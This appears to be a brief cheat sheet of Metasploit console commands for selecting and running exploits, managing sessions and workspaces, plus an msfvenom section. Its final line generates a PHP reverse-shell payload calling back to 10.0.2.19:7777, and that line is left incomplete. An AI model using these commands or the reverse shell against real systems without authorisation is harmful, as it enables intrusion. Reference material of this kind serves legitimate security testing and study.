# Metasploit Framework Commands

exit # Exit msfconsole
ls # List contents directories
use <exploit> # Specify an exploit to use
back # leave a context
info # Get detailed info on module within its context
set <param_name> <value> # setting parameter and values
set rhosts <target-ip> # set rhosts parameter to target
unset <param> # Unset a specific parameter 
unset all # Unset all parameters
setg <param> # Set global parameter (Works across different context)
unsetg <param> # Unset a global parameter
exploit # once all params are set, you can exploit the target
exploit -z # -z command will run the exploit and background the session as soon as it opens.
sessions -l # List all sessions
sessions -i <session-id> # Interact with specific session in the meterpreter
show payloads# Show Payloads Compatible with a Module
set payload <payload_name> # Set a Payload
check # Check if a target is vulnerable
save # Save current configuration
show auxiliary # Show auxiliary modules
use auxiliary/<module_name> # Use Auxiliary Module
run # Run Auxiliary Module
db_connect # Connect to the Database:
db_nmap <target> # Store results in the database
hosts # View stored hosts
services # View stored services
search portscan # List port scanning modules
db_status # Check the database status 
workspace # List availables workspaces
workspace -a <workspace_name> # Add a workspace
workspace -d <workspace_name> # Delete a workspace


# =========
# MSF Venom
# =========

msfvenom -l payloads # List msfvenom payloads
msfvenom --list format # List supported output formats
msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > # Generating a Reverse Shell








